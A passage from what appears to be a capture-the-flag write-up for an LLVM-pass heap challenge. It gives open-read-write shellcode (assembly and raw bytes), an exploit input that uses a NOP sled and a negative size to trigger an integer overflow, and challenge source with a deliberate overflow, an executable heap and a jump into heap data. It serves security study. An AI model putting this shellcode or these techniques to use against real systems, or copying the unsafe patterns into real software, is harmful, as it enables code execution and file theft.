class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov edx,0x67616c66  </span><br><span class="hljs-string">push rdx </span><br><span class="hljs-string">mov rdi,rsp</span><br><span class="hljs-string">xor esi,esi </span><br><span class="hljs-string">xor rax,rax</span><br><span class="hljs-string">mov al,2</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">mov edi,eax</span><br><span class="hljs-string">mov rsi,rsp</span><br><span class="hljs-string">xor eax,eax</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">xor di,2 </span><br><span class="hljs-string">mov eax,edi</span><br><span class="hljs-string">syscall  </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>)<br></code></pre></td></tr></table></figure><figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">\xba\x66\x6c\x61\x67\x52\x48\x89\xe7\x31\xf6\x48\x31\xc0\xb0\x02\x0f\x05\x89\xc7\x48\x89\xe6\x31\xc0\x0f\x05\x66\x83\xf7\x02\x89\xf8\x0f\x05<br></code></pre></td></tr></table></figure><h3 id="3-exp"><a href="#3-exp" class="headerlink" title="3.exp"></a>3.exp</h3><p>概率orw</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">sell</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">buy</span><span class="hljs-params">(<span class="hljs-type">int</span> sz)</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">edit</span><span class="hljs-params">(<span class="hljs-type">int</span> idx,<span class="hljs-type">char</span>* buf)</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">locate</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">show</span><span class="hljs-params">()</span></span>;<br><br><span class="hljs-type">char</span> buf[<span class="hljs-number">35</span>+<span class="hljs-number">0x800</span>+<span class="hljs-number">0x1</span>] = <span class="hljs-string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xba\x66\x6c\x61\x67\x52\x48\x89\xe7\x31\xf6\x48\x31\xc0\xb0\x02\x0f\x05\x89\xc7\x48\x89\xe6\x31\xc0\x0f\x05\x66\x83\xf7\x02\x89\xf8\x0f\x05&quot;</span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">start</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-built_in">sell</span>(<span class="hljs-number">0</span>);<br><span class="hljs-built_in">show</span>();<br><span class="hljs-built_in">buy</span>(<span class="hljs-number">-0x15000</span>);<br><span class="hljs-built_in">show</span>();<br><span class="hljs-built_in">sell</span>(<span class="hljs-number">1</span>);<br><span class="hljs-built_in">show</span>();<br><span class="hljs-built_in">buy</span>(<span class="hljs-number">0x1000</span>);<br><span class="hljs-built_in">show</span>();<br><span class="hljs-built_in">edit</span>(<span class="hljs-number">0</span>,buf);<br><span class="hljs-built_in">locate</span>();<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="4-源码"><a href="#4-源码" class="headerlink" title="4.源码"></a>4.源码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/IR/PassManager.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/Passes/PassBuilder.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/Passes/PassPlugin.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;llvm/Support/raw_ostream.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span>  <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span>  <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span>  <span class="hljs-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span>  <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;seccomp.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGSIZE  4096</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PGROUNDDOWN(a) (((a)) &amp; ~(PGSIZE-1))</span><br><span class="hljs-type">void</span> *table[<span class="hljs-number">10</span>];<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> chunk_size[<span class="hljs-number">10</span>]=&#123;<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>&#125;;<br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *treasuremap=<span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> init_done=<span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br><span class="hljs-type">static</span> <span class="hljs-type">int</span> money = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> llvm;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">init</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br><span class="hljs-built_in">srand</span>(<span class="hljs-built_in">time</span>(<span class="hljs-literal">NULL</span>));<br><span class="hljs-keyword">while</span>(i&lt;<span class="hljs-number">10</span>)&#123;<br>table[i] = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x70</span>);<br>chunk_size[i] = <span class="hljs-number">0x70</span>;<br>i++;<br>&#125;<br>treasuremap = table[<span class="hljs-number">0</span>];<br><span class="hljs-type">int</span> flag=<span class="hljs-number">0</span>;<br><span class="hljs-type">void</span>* heap_addr = (<span class="hljs-type">void</span>*)((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)table[<span class="hljs-number">0</span>] &amp; <span class="hljs-number">0xfffffffffffff000</span>);<br>flag = <span class="hljs-built_in">mprotect</span>(heap_addr,<span class="hljs-number">0x8000</span>,PROT_EXEC | PROT_READ | PROT_WRITE);<br><span class="hljs-comment">//errs() &lt;&lt; &quot;modify address : &quot; &lt;&lt; heap_addr &lt;&lt; &#x27;\n&#x27;;</span><br><span class="hljs-comment">//errs() &lt;&lt; &quot;modify flag : &quot; &lt;&lt; flag &lt;&lt; &#x27;\n&#x27;;</span><br><span class="hljs-comment">//errs() &lt;&lt; &quot;heapbase : &quot; &lt;&lt; table[0] &lt;&lt; &#x27;\n&#x27;;</span><br>&#125;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">buried</span><span class="hljs-params">()</span></span>&#123;<br>    scmp_filter_ctx ctx;<br>    ctx = <span class="hljs-built_in">seccomp_init</span>(SCMP_ACT_ALLOW);<br>    <span class="hljs-built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_KILL, <span class="hljs-built_in">SCMP_SYS</span>(execve), <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">seccomp_rule_add</span>(ctx, SCMP_ACT_KILL, <span class="hljs-built_in">SCMP_SYS</span>(execveat), <span class="hljs-number">0</span>);<br>    <span class="hljs-built_in">seccomp_load</span>(ctx);<br>    <span class="hljs-comment">//close(1);</span><br>    <span class="hljs-comment">//close(2);</span><br>    <span class="hljs-comment">//errs() &lt;&lt; &quot;treasuremap : &quot; &lt;&lt; treasuremap &lt;&lt; &#x27;\n&#x27;;</span><br>    ((*(<span class="hljs-built_in">void</span>(*) ()) (treasuremap)))(); <span class="hljs-comment">//edit -&gt; shellcode</span><br>&#125;<br><span class="hljs-keyword">namespace</span> &#123;<br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">optimizer</span> : <span class="hljs-keyword">public</span> PassInfoMixin&lt;optimizer&gt; &#123;<br>  <span class="hljs-function">PreservedAnalyses <span class="hljs-title">run</span><span class="hljs-params">(Function &amp;F, FunctionAnalysisManager &amp;FAM)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span>(!init_done)&#123;<br>    <span class="hljs-built_in">init</span>();<br>    init_done = <span class="hljs-number">1</span>;<br>    &#125;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;Legend has it that there is a place where the treasure is buried.&quot;</span> &lt;&lt; std::endl; <br>    std::string VulnName = F.<span class="hljs-built_in">getName</span>().<span class="hljs-built_in">str</span>();<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;You&#x27;re a young business man and you want to : &quot;</span> &lt;&lt; VulnName &lt;&lt; std::endl;<br>    <span class="hljs-keyword">if</span>(VulnName == <span class="hljs-string">&quot;start&quot;</span>)&#123;<br>      SymbolTableList&lt;BasicBlock&gt;::const_iterator bbEnd = F.<span class="hljs-built_in">end</span>();<br>      <span class="hljs-keyword">for</span>(SymbolTableList&lt;BasicBlock&gt;::const_iterator bbIter = F.<span class="hljs-built_in">begin</span>(); bbIter != bbEnd; ++bbIter)&#123;<br>        SymbolTableList&lt;Instruction&gt;::const_iterator instIter = bbIter-&gt;<span class="hljs-built_in">begin</span>();<br>        SymbolTableList&lt;Instruction&gt;::const_iterator instEnd  = bbIter-&gt;<span class="hljs-built_in">end</span>();<br>        <span class="hljs-keyword">for</span>(; instIter != instEnd; ++instIter)&#123;<br>          <span class="hljs-keyword">if</span> (instIter-&gt;<span class="hljs-built_in">getOpcode</span>() == <span class="hljs-number">56</span>) &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-type">const</span> CallInst* call_inst = <span class="hljs-built_in">dyn_cast</span>&lt;CallInst&gt;(instIter)) &#123;<br>              std::string FunctionName = call_inst-&gt;<span class="hljs-built_in">getCalledFunction</span>()-&gt;<span class="hljs-built_in">getName</span>().<span class="hljs-built_in">str</span>();<br>              <span class="hljs-keyword">if</span>(FunctionName == <span class="hljs-string">&quot;sell&quot;</span>)&#123;<br>                <span class="hljs-keyword">if</span>(instIter-&gt;<span class="hljs-built_in">getNumOperands</span>()==<span class="hljs-number">2</span>)&#123;<br>                  <span class="hljs-type">int</span> idx1 =  <span class="hljs-built_in">dyn_cast</span>&lt;ConstantInt&gt;(call_inst-&gt;<span class="hljs-built_in">getArgOperand</span>(<span class="hljs-number">0</span>))-&gt;<span class="hljs-built_in">getZExtValue</span>();<br>                  <span class="hljs-keyword">if</span>(idx1&gt;=<span class="hljs-number">0</span> &amp;&amp; idx1&lt;<span class="hljs-number">10</span> &amp;&amp; (table[idx1]))&#123;<br><span class="hljs-built_in">free</span>(table[idx1]);<br>table[idx1] = <span class="hljs-number">0</span>;<br>money += chunk_size[idx1];<br>chunk_size[idx1] = <span class="hljs-number">0</span>;<br>std::cout &lt;&lt; <span class="hljs-string">&quot;selled a land&quot;</span> &lt;&lt; std::endl;<br>                  &#125;<br>                  <span class="hljs-keyword">else</span>&#123;<br>                  std::cout &lt;&lt; <span class="hljs-string">&quot;failed to sell&quot;</span> &lt;&lt; std::endl;<br>                  &#125;<br>              &#125;<br>              &#125;<br>              <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(FunctionName == <span class="hljs-string">&quot;buy&quot;</span>)&#123;<br>                <span class="hljs-keyword">if</span>(instIter-&gt;<span class="hljs-built_in">getNumOperands</span>()==<span class="hljs-number">2</span>)&#123;<br>                <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> sz =  <span class="hljs-built_in">dyn_cast</span>&lt;ConstantInt&gt;(call_inst-&gt;<span class="hljs-built_in">getArgOperand</span>(<span class="hljs-number">0</span>))-&gt;<span class="hljs-built_in">getZExtValue</span>();<br>                i=<span class="hljs-number">0</span>;<br>                <span class="hljs-keyword">if</span>((<span class="hljs-type">int</span>)sz&lt;=money)&#123;     <span class="hljs-comment">//int overflow</span><br>                <span class="hljs-keyword">while</span>(i&gt;=<span class="hljs-number">0</span> &amp;&amp; i&lt;=<span class="hljs-number">9</span>)&#123;   <br><span class="hljs-keyword">if</span>(!*(&amp;(table[<span class="hljs-number">0</span>])+i))&#123;<br>*(&amp;(table[<span class="hljs-number">0</span>])+i) = <span class="hljs-built_in">malloc</span>(sz);<br>std::cout &lt;&lt; <span class="hljs-string">&quot;buy a land at : &quot;</span>&lt;&lt; *(&amp;(table[<span class="hljs-number">0</span>])+i) &lt;&lt; std::endl;<br><span class="hljs-comment">//errs() &lt;&lt; &quot;buy a 